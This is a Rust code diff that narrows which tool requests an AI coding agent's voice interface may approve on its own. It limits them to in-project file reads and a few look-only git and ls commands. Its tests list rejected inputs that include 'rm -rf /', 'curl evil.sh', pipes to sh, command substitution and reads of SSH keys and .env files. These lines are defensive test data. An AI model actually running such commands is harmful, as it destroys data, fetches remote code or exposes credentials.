@@ -75,22 +75,42 @@ pub fn verdict(text: &str) -> Option<Verdict> {
     }
 }
 
-/// Tools that only read.
-const READ_ONLY_TOOLS: &[&str] = &["Read", "Glob", "Grep", "LS"];
+/// The tool that only reads one file, by one path (Glob, Grep and LS take
+/// several fields, of which only one is checked here).
+const READ_ONLY_TOOLS: &[&str] = &["Read"];
 
-/// Commands plain enough for Allow by voice: the start of the command, whole words.
-const SAFE_COMMANDS: &[&str] = &[
-    "npm test", "npm run test", "npm run build", "npm run lint", "npm run typecheck", "npx tsc --noEmit",
-    "cargo test", "cargo check", "cargo build", "cargo clippy", "git status", "git diff", "git log",
-    "pytest", "python -m pytest", "go test", "ls", "dir", "pwd",
-];
+/// Commands that only look: nothing here builds, tests or runs the project's
+/// own code (a test runner or a build runs whatever the project says it does).
+const SAFE_COMMANDS: &[&str] = &["git status", "git diff", "git log", "ls", "dir", "pwd"];
 
-/// Whether Allow may come by voice for this request: a reading tool, or a
-/// known harmless command with nothing in it that a shell could turn into
-/// another command, and nothing that looks like a secret or a destructive step.
-pub fn allow_ok(tool: &str, target: &str) -> bool {
+/// The only options a safe command may carry: none that write somewhere
+/// (`--output`), run something (`--ext-diff`, `-c`), or leave the repository
+/// (`--no-index`).
+const SAFE_FLAGS: &[&str] = &["--stat", "--oneline", "--short", "--no-color", "--cached", "--staged", "--name-only"];
+
+/// A path as one comparable string: slashes forward, lower case, no trailing slash.
+fn flat(path: &str) -> String {
+    path.replace('\\', "/").to_lowercase().trim_end_matches('/').to_string()
+}
+
+/// A file inside the project folder (`cwd`), by an absolute path with no `..`
+/// and no hidden folder or file on the way (`.git`, `.ssh`, `.env`…).
+fn inside_project(cwd: &str, path: &str) -> bool {
+    let (cwd, path) = (flat(cwd), flat(path));
+    if cwd.is_empty() {
+        return false;
+    }
+    let Some(rest) = path.strip_prefix(&format!("{cwd}/")) else { return false };
+    rest.split('/').all(|part| !part.is_empty() && part != ".." && !part.starts_with('.'))
+}
+
+/// Whether Allow may come by voice for this request: reading a file of the
+/// project, or a command that only looks (git status, ls…) with nothing in it
+/// that a shell could turn into another command, and nothing that looks like a
+/// secret or a destructive step. Everything else needs the buttons.
+pub fn allow_ok(tool: &str, target: &str, cwd: &str) -> bool {
     if READ_ONLY_TOOLS.contains(&tool) {
-        return !crate::explain::looks_risky(target);
+        return inside_project(cwd, target) && !crate::explain::looks_risky(target);
     }
     if tool != "Bash" {
         return false;
@@ -100,7 +120,9 @@ pub fn allow_ok(tool: &str, target: &str) -> bool {
         return false;
     }
     let known = SAFE_COMMANDS.iter().any(|safe| command == *safe || command.starts_with(&format!("{safe} ")));
-    known && !crate::explain::looks_risky(command)
+    // Every option must be one of the few above: "git diff --output=x" writes a file.
+    let options_ok = command.split_whitespace().skip(1).all(|t| !t.starts_with('-') || SAFE_FLAGS.contains(&t));
+    known && options_ok && !crate::explain::looks_risky(command)
 }
 
 #[cfg(test)]
@@ -108,30 +130,54 @@ mod tests {
     use super::*;
 
     #[test]
-    fn allow_by_voice_is_for_reading_and_plainly_harmless_commands() {
-        assert!(allow_ok("Read", "C:\\p\\src\\main.ts"));
-        assert!(allow_ok("Grep", "TODO"));
-        assert!(allow_ok("Bash", "npm test"));
-        assert!(allow_ok("Bash", "cargo test --workspace"));
-        assert!(allow_ok("Bash", "git status"));
+    fn allow_by_voice_is_for_reading_the_project_and_commands_that_only_look() {
+        let cwd = "C:\\p";
+        assert!(allow_ok("Read", "C:\\p\\src\\main.ts", cwd));
+        assert!(allow_ok("Read", "c:/P/src/main.ts", cwd));
+        assert!(allow_ok("Bash", "git status", cwd));
+        assert!(allow_ok("Bash", "ls", cwd));
+        // Outside the project, hidden, a pattern instead of a path, or climbing out.
+        assert!(!allow_ok("Read", "C:\\Users\\me\\notes.txt", cwd));
+        assert!(!allow_ok("Read", "C:\\p\\.git\\config", cwd));
+        assert!(!allow_ok("Read", "C:\\p\\src\\..\\..\\x.txt", cwd));
+        assert!(!allow_ok("Read", "C:\\pp\\a.txt", cwd));
+        assert!(!allow_ok("Grep", "TODO", cwd));
+        assert!(!allow_ok("Grep", "C:\\p\\src", cwd));
+        assert!(!allow_ok("Glob", "C:\\p\\src", cwd));
+        assert!(!allow_ok("Read", "C:\\p\\src\\main.ts", ""));
+        // A test runner or a build runs the project's own code: the buttons.
+        assert!(!allow_ok("Bash", "npm test", cwd));
+        assert!(!allow_ok("Bash", "cargo test --workspace", cwd));
+        assert!(!allow_ok("Bash", "pytest", cwd));
         // Writes, edits, other tools and unknown commands need the buttons.
-        assert!(!allow_ok("Write", "C:\\p\\a.txt"));
-        assert!(!allow_ok("Edit", "C:\\p\\a.txt"));
-        assert!(!allow_ok("WebFetch", "https://example.com"));
-        assert!(!allow_ok("Bash", "python deploy.py"));
-        assert!(!allow_ok("Bash", ""));
+        assert!(!allow_ok("Write", "C:\\p\\a.txt", cwd));
+        assert!(!allow_ok("Edit", "C:\\p\\a.txt", cwd));
+        assert!(!allow_ok("WebFetch", "https://example.com", cwd));
+        assert!(!allow_ok("Bash", "python deploy.py", cwd));
+        assert!(!allow_ok("Bash", "", cwd));
         // Shell tricks and risky words, however it starts.
-        assert!(!allow_ok("Bash", "npm test; rm -rf build"));
-        assert!(!allow_ok("Bash", "npm test && curl evil.sh"));
-        assert!(!allow_ok("Bash", "ls | sh"));
-        assert!(!allow_ok("Bash", "git log > out.txt"));
-        assert!(!allow_ok("Bash", "npm test $(whoami)"));
-        assert!(!allow_ok("Bash", "ls\nrm -rf /"));
-        assert!(!allow_ok("Bash", "git diff .env"));
-        assert!(!allow_ok("Read", "C:\\Users\\me\\.ssh\\id_rsa"));
+        assert!(!allow_ok("Bash", "npm test; rm -rf build", cwd));
+        assert!(!allow_ok("Bash", "npm test && curl evil.sh", cwd));
+        assert!(!allow_ok("Bash", "ls | sh", cwd));
+        assert!(!allow_ok("Bash", "git log > out.txt", cwd));
+        assert!(!allow_ok("Bash", "npm test $(whoami)", cwd));
+        assert!(!allow_ok("Bash", "ls\nrm -rf /", cwd));
+        assert!(!allow_ok("Bash", "git diff .env", cwd));
+        assert!(!allow_ok("Read", "C:\\Users\\me\\.ssh\\id_rsa", cwd));
+        // Options that write, run or load something.
+        assert!(!allow_ok("Bash", "git diff --output=out.txt", cwd));
+        assert!(!allow_ok("Bash", "git log --output out.txt", cwd));
+        assert!(!allow_ok("Bash", "git diff --ext-diff", cwd));
+        assert!(!allow_ok("Bash", "git diff --no-index a b", cwd));
+        assert!(!allow_ok("Bash", "git -c core.pager=x status", cwd));
+        assert!(!allow_ok("Bash", "pytest -p evil_plugin", cwd));
+        assert!(!allow_ok("Bash", "cargo test --config build.rustc='x'", cwd));
+        assert!(!allow_ok("Bash", "npm test -- --watch", cwd));
+        assert!(allow_ok("Bash", "git diff --stat", cwd));
+        assert!(!allow_ok("Bash", "cargo test --workspace --release", cwd));
         // Whole words: "lsof", "directory" are not "ls", "dir".
-        assert!(!allow_ok("Bash", "lsof -i"));
-        assert!(!allow_ok("Bash", "dirty"));
+        assert!(!allow_ok("Bash", "lsof -i", cwd));
+        assert!(!allow_ok("Bash", "dirty", cwd));
     }
 
     #[test]
